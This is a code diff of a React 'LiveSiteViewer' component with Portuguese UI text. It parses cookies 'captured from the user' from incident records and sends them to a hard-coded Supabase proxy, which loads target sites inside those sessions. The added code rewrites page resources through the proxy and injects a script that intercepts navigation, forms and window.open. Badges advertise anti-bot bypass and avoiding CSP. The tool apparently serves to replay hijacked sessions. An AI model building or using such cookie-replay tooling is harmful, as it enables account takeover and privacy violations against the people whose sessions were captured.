@@ -4,7 +4,6 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Alert, AlertDescription } from "@/components/ui/alert";
-import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
 interface LiveSiteViewerProps {
@@ -18,17 +17,17 @@ interface LiveSiteViewerProps {
   onClose: () => void;
 }
 
+const PROXY_BASE = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
+
 export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
-  const [proxyUrl, setProxyUrl] = useState<string | null>(null);
   const [srcDoc, setSrcDoc] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
   const [cookies, setCookies] = useState<any[]>([]);
   const [currentUrl, setCurrentUrl] = useState<string | null>(null);
   const [iframeKey, setIframeKey] = useState(0);
-  const readyTimeoutRef = useRef<number | null>(null);
 
+  // Parse cookies from incident data
   useEffect(() => {
-    // Try to get cookies from multiple sources (both snake_case and camelCase)
     const cookieSource = incident.full_cookie_data 
       || incident.cookie_data 
       || (incident as any).cookie_excerpt 
@@ -39,11 +38,9 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         let parsedData;
         
         if (typeof cookieSource === 'string') {
-          // Try JSON parse first
           try {
             parsedData = JSON.parse(cookieSource);
           } catch {
-            // If JSON parse fails, try parsing as cookie string format: "name=value; name2=value2"
             if (cookieSource.includes('=')) {
               parsedData = cookieSource.split(';').map(pair => {
                 const [name, ...valueParts] = pair.trim().split('=');
@@ -60,11 +57,9 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
           parsedData = cookieSource;
         }
 
-        // Convert different cookie data formats to standard format
         let cookieArray = [];
         
         if (Array.isArray(parsedData)) {
-          // Already in array format - filter out invalid entries
           cookieArray = parsedData
             .filter(c => c && typeof c === 'object' && c.name && c.value && c._type !== 'undefined')
             .map(c => ({
@@ -73,7 +68,6 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               path: c.path || '/'
             }));
         } else if (parsedData && typeof parsedData === 'object') {
-          // Convert object format {name: value} to array format
           cookieArray = Object.entries(parsedData)
             .filter(([name, value]) => name && value && value !== 'undefined')
             .map(([name, value]) => ({
@@ -84,7 +78,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
             }));
         }
         
-        console.log('[LiveSiteViewer] Parsed cookies:', cookieArray.length, 'cookies');
+        console.log('[LocalProxy] Parsed cookies:', cookieArray.length, 'cookies');
         setCookies(cookieArray);
       } catch (error) {
         console.error('Error parsing cookie data:', error);
@@ -95,95 +89,196 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     }
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
-  // Listen for navigation and ready messages from iframe
+  // Fetch raw content from backend (cookies + DNS tunnel via site-proxy)
+  const fetchRawContent = async (url: string): Promise<string> => {
+    console.log('[LocalProxy] Fetching raw content:', url);
+    const response = await fetch(PROXY_BASE, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        url, 
+        incidentId: incident.id, 
+        cookies,
+        rawContent: true
+      })
+    });
+    
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}`);
+    }
+    
+    return await response.text();
+  };
+
+  // Process HTML content locally: rewrite URLs and inject interception script
+  const processContent = (html: string, baseUrl: string): string => {
+    console.log('[LocalProxy] Processing content for:', baseUrl);
+    
+    const base = new URL(baseUrl);
+    const origin = `${base.protocol}//${base.host}`;
+    
+    let processed = html;
+    
+    // Rewrite CSS links
+    processed = processed.replace(
+      /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          const absolute = new URL(url, origin).href;
+          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
+          return `${prefix}${proxied}${suffix}`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite Scripts
+    processed = processed.replace(
+      /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          const absolute = new URL(url, origin).href;
+          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
+          return `${prefix}${proxied}${suffix}`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite Images
+    processed = processed.replace(
+      /(<img[^>]+src=["'])([^"']+)(["'])/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          const absolute = new URL(url, origin).href;
+          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
+          return `${prefix}${proxied}${suffix}`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite anchors (for navigation)
+    processed = processed.replace(
+      /(<a\s[^>]*href=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          const absolute = new URL(url, origin).href;
+          return `${prefix}${absolute}${suffix} data-orig-href="${absolute}"`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite forms
+    processed = processed.replace(
+      /(<form\s[^>]*action=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          const absolute = new URL(url, origin).href;
+          return `${prefix}${absolute}${suffix} data-orig-action="${absolute}"`;
+        } catch { return match; }
+      }
+    );
+    
+    // Inject custom interception script
+    const interceptionScript = `
+<script>
+(function() {
+  const BASE_URL = ${JSON.stringify(baseUrl)};
+  const INCIDENT_ID = ${JSON.stringify(incident.id)};
+  
+  console.log('[LocalProxy] Interception active for:', BASE_URL);
+  
+  // Intercept all link clicks
+  document.addEventListener('click', function(e) {
+    const target = e.target.closest('a');
+    if (!target || !target.href) return;
+    
+    e.preventDefault();
+    e.stopPropagation();
+    
+    const destination = target.getAttribute('data-orig-href') || target.href;
+    console.log('[LocalProxy] Navigate to:', destination);
+    window.parent.postMessage({ type: 'local-proxy:navigate', url: destination, incidentId: INCIDENT_ID }, '*');
+  }, true);
+  
+  // Intercept form submissions
+  document.addEventListener('submit', function(e) {
+    const form = e.target;
+    if (form.method.toUpperCase() === 'GET') {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const params = new URLSearchParams(formData);
+      const action = form.getAttribute('data-orig-action') || form.action;
+      const destination = action + '?' + params.toString();
+      console.log('[LocalProxy] Form navigate to:', destination);
+      window.parent.postMessage({ type: 'local-proxy:navigate', url: destination, incidentId: INCIDENT_ID }, '*');
+    }
+  }, true);
+  
+  // Override window.open
+  const originalOpen = window.open;
+  window.open = function(url) {
+    if (url) {
+      window.parent.postMessage({ type: 'local-proxy:navigate', url: url, incidentId: INCIDENT_ID }, '*');
+    }
+    return null;
+  };
+  
+  // Send ready signal
+  window.parent.postMessage({ type: 'local-proxy:ready', url: BASE_URL }, '*');
+})();
+</script>`;
+    
+    // Inject script before closing </head> or </body>
+    if (processed.includes('</head>')) {
+      processed = processed.replace('</head>', `${interceptionScript}</head>`);
+    } else if (processed.includes('</body>')) {
+      processed = processed.replace('</body>', `${interceptionScript}</body>`);
+    } else {
+      processed = processed + interceptionScript;
+    }
+    
+    return processed;
+  };
+
+  // Handle navigation within the proxied site
+  const handleNavigation = async (targetUrl: string) => {
+    console.log('[LocalProxy] Navigating to:', targetUrl);
+    setError(null);
+    setCurrentUrl(targetUrl);
+    
+    try {
+      const rawHtml = await fetchRawContent(targetUrl);
+      const processedHtml = processContent(rawHtml, targetUrl);
+      
+      // Update iframe with new content
+      setIframeKey(k => k + 1);
+      setSrcDoc(processedHtml);
+      
+      toast.success('Página carregada');
+    } catch (err: any) {
+      console.error('[LocalProxy] Navigation error:', err);
+      setError(err.message || 'Erro ao navegar');
+      toast.error('Falha ao carregar página');
+    }
+  };
+
+  // Listen for navigation messages from iframe
   useEffect(() => {
-    const handleMessage = async (event: MessageEvent) => {
-      // Handle proxy:ready signal
-      if (event.data?.type === 'proxy:ready') {
-        console.log('[LiveSiteViewer] ✅ proxy:ready recebido para:', event.data.url);
-        if (readyTimeoutRef.current) {
-          clearTimeout(readyTimeoutRef.current);
-          readyTimeoutRef.current = null;
-        }
+    const handleMessage = (event: MessageEvent) => {
+      if (event.data?.type === 'local-proxy:ready') {
+        console.log('[LocalProxy] ✅ Ready signal received:', event.data.url);
         return;
       }
       
-      // Handle navigation
-      if (event.data?.type === 'proxy:navigate') {
+      if (event.data?.type === 'local-proxy:navigate') {
         const { url, incidentId } = event.data;
-        
         if (incidentId !== incident.id) return;
         
-        // Viewer-side debounce: ignore if same URL (normalized)
-        const normalizeUrl = (u: string) => {
-          try {
-            const parsed = new URL(u);
-            return parsed.origin + parsed.pathname + parsed.search;
-          } catch { return u; }
-        };
-        
-        if (currentUrl && normalizeUrl(url) === normalizeUrl(currentUrl)) {
-          console.log('[LiveSiteViewer] proxy:navigate (ignored - same URL):', url);
-          return;
-        }
-        
-        console.log('[LiveSiteViewer] proxy:navigate →', url);
-        setError(null);
-        setCurrentUrl(url);
-        
-        try {
-          const proxyBase = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
-          
-          const response = await fetch(proxyBase, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              url, 
-              incidentId: incident.id, 
-              cookies, 
-              forceHtml: true 
-            })
-          });
-          
-          if (response.ok) {
-            const html = await response.text();
-            console.log('[LiveSiteViewer] POST OK → srcDoc atualizado');
-            
-            // Clear any existing timeout
-            if (readyTimeoutRef.current) {
-              clearTimeout(readyTimeoutRef.current);
-            }
-            
-            // Force iframe remount and set new content
-            setIframeKey(k => k + 1);
-            setSrcDoc(html);
-            setProxyUrl(null);
-            
-            // Setup ready timeout - just log, keep srcDoc
-            console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
-            readyTimeoutRef.current = window.setTimeout(() => {
-              console.warn('[LiveSiteViewer] ⚠️ proxy:ready timeout (6000ms) — mantendo srcDoc');
-            }, 6000);
-            
-            toast.success('Página carregada');
-          } else {
-            throw new Error(`Failed to load: ${response.status}`);
-          }
-        } catch (err: any) {
-          console.error('[LiveSiteViewer] Navigation error:', err);
-          setError(err.message || 'Erro ao navegar');
-          toast.error('Falha ao carregar página');
-        }
+        handleNavigation(url);
       }
     };
     
     window.addEventListener('message', handleMessage);
-    return () => {
-      window.removeEventListener('message', handleMessage);
-      if (readyTimeoutRef.current) {
-        clearTimeout(readyTimeoutRef.current);
-      }
-    };
+    return () => window.removeEventListener('message', handleMessage);
   }, [incident.id, cookies]);
 
   const loadSiteWithCookies = async () => {
@@ -192,57 +287,10 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       return;
     }
 
-    setError(null);
-
-    try {
-      console.log('Loading site with cookies:', incident.tab_url, cookies);
-
-      const proxyBase = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
-      setSrcDoc(null);
-
-      // 1) Tenta via POST e injeta no srcDoc (mais robusto)
-      const postResp = await fetch(proxyBase, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url: incident.tab_url, incidentId: incident.id, cookies, forceHtml: true })
-      });
-
-      if (postResp.ok) {
-        const text = await postResp.text();
-        console.log('[LiveSiteViewer] POST renderizado como HTML');
-        
-        // Clear any existing timeout
-        if (readyTimeoutRef.current) {
-          clearTimeout(readyTimeoutRef.current);
-        }
-        
-        // Force iframe remount and set content
-        setIframeKey(k => k + 1);
-        setSrcDoc(text);
-        setProxyUrl(null);
-        setCurrentUrl(incident.tab_url);
-        
-        // Setup ready timeout - just log, keep srcDoc
-        console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
-        readyTimeoutRef.current = window.setTimeout(() => {
-          console.warn('[LiveSiteViewer] ⚠️ proxy:ready timeout (6000ms) — mantendo srcDoc');
-        }, 6000);
-        
-        toast.success('Site renderizado via proxy');
-        return;
-      } else {
-        throw new Error(`POST failed: ${postResp.status}`);
-      }
-
-    } catch (err: any) {
-      console.error('Error loading site:', err);
-      setError(err.message || 'Erro ao carregar site');
-      toast.error('Falha ao carregar site com cookies');
-    }
+    await handleNavigation(incident.tab_url);
   };
 
   const refreshSite = () => {
-    setProxyUrl(null);
     setSrcDoc(null);
     setTimeout(() => loadSiteWithCookies(), 100);
   };
@@ -251,6 +299,37 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     const urlToOpen = currentUrl || incident.tab_url;
     if (urlToOpen) {
       window.open(urlToOpen, '_blank');
+    }
+  };
+
+  const openProxiedInNewTab = async () => {
+    const urlToOpen = currentUrl || incident.tab_url;
+    if (!urlToOpen) return;
+    
+    toast.info('Carregando página...');
+    
+    try {
+      const rawHtml = await fetchRawContent(urlToOpen);
+      const processedHtml = processContent(rawHtml, urlToOpen);
+      
+      // Create Blob with processed HTML
+      const blob = new Blob([processedHtml], { type: 'text/html; charset=utf-8' });
+      const blobUrl = URL.createObjectURL(blob);
+      
+      const win = window.open(blobUrl, '_blank');
+      if (!win) {
+        URL.revokeObjectURL(blobUrl);
+        toast.error('Pop-up bloqueado pelo navegador');
+        return;
+      }
+      
+      // Clean up blob URL after page loads
+      setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
+      
+      toast.success('Aberto em nova aba (Proxy Local)');
+    } catch (e: any) {
+      console.error('Erro ao abrir em nova aba:', e);
+      toast.error(e.message || 'Erro ao carregar página');
     }
   };
 
@@ -275,11 +354,9 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               {cookies.length} cookies • Anti-bot bypass
             </Badge>
           )}
-          {proxyUrl && (
-            <Badge variant="outline" className="ml-2 text-primary border-primary">
-              Proxy Universal • Imagens + CSS + JS
-            </Badge>
-          )}
+          <Badge variant="outline" className="ml-2 text-primary border-primary">
+            Proxy Local • Sem CSP Supabase
+          </Badge>
         </div>
 
         <div className="flex items-center gap-2 mt-2">
@@ -293,7 +370,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
             Carregar com Cookies
           </Button>
           
-          {proxyUrl && (
+          {srcDoc && (
             <Button
               onClick={refreshSite}
               variant="outline"
@@ -316,48 +393,14 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
           </Button>
           
           <Button
-            onClick={async () => {
-              const urlToOpen = currentUrl || incident.tab_url;
-              if (!urlToOpen) return;
-              const proxiedUrl = `https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy?url=${encodeURIComponent(urlToOpen)}&incident=${incident.id}&forceHtml=1`;
-              
-              toast.info('Carregando página...');
-              
-              try {
-                const resp = await fetch(proxiedUrl, { method: 'GET' });
-                if (!resp.ok) {
-                  throw new Error(`HTTP ${resp.status}`);
-                }
-                
-                const html = await resp.text();
-                
-                // Criar Blob com o HTML e abrir como URL de objeto
-                const blob = new Blob([html], { type: 'text/html; charset=utf-8' });
-                const blobUrl = URL.createObjectURL(blob);
-                
-                const win = window.open(blobUrl, '_blank');
-                if (!win) {
-                  URL.revokeObjectURL(blobUrl);
-                  toast.error('Pop-up bloqueado pelo navegador');
-                  return;
-                }
-                
-                // Limpar blob URL após alguns segundos (depois que a página carregar)
-                setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
-                
-                toast.success('Aberto em nova aba via proxy');
-              } catch (e: any) {
-                console.error('Erro ao abrir em nova aba:', e);
-                toast.error(e.message || 'Erro ao carregar página');
-              }
-            }}
+            onClick={openProxiedInNewTab}
             variant="default"
             size="sm"
             className="gap-2"
             disabled={!incident.tab_url}
           >
             <ExternalLink className="h-4 w-4" />
-            Nova Aba (Proxied)
+            Nova Aba (Proxy Local)
           </Button>
         </div>
       </CardHeader>
@@ -372,29 +415,17 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
         {srcDoc && (
           <iframe
-            key={`srcdoc-${iframeKey}`}
+            key={`local-proxy-${iframeKey}`}
             srcDoc={srcDoc}
             className="w-full h-full border-0"
-            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
             title={`Site: ${incident.host}`}
-            onLoad={() => console.log('[LiveSiteViewer] Iframe srcDoc carregado')}
-            onError={(e) => console.error('[LiveSiteViewer] Iframe srcDoc erro:', e)}
+            onLoad={() => console.log('[LocalProxy] Iframe loaded')}
+            onError={(e) => console.error('[LocalProxy] Iframe error:', e)}
           />
         )}
 
-        {!srcDoc && proxyUrl && (
-          <iframe
-            key={`proxy-${iframeKey}`}
-            src={proxyUrl}
-            className="w-full h-full border-0"
-            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
-            title={`Site: ${incident.host}`}
-            onLoad={() => console.log('[LiveSiteViewer] Iframe carregado via URL')}
-            onError={(e) => console.error('[LiveSiteViewer] Iframe URL erro:', e)}
-          />
-        )}
-
-        {!proxyUrl && !error && (
+        {!srcDoc && !error && (
           <div className="flex items-center justify-center h-64 text-center">
             <div>
               <Globe className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
@@ -402,7 +433,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
                 Clique em "Carregar com Cookies" para visualizar o site
               </p>
               <p className="text-sm text-muted-foreground">
-                O site será carregado com os cookies capturados do usuário
+                Proxy local com controle total • Sem CSP do Supabase
               </p>
             </div>
           </div>
